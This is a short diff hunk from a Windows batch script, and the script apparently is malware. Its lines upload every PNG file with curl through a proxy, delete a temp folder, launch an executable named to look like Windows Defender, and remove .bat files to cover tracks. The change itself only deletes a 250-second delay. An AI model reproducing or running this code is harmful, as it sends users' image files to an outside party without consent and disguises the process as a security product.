@@ -97,8 +97,6 @@ for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#"
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
-timeout -t 250
-
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
 powershell.exe Remove-Item -Force -Recurse "%environment%\Win32\*.bat" && exit
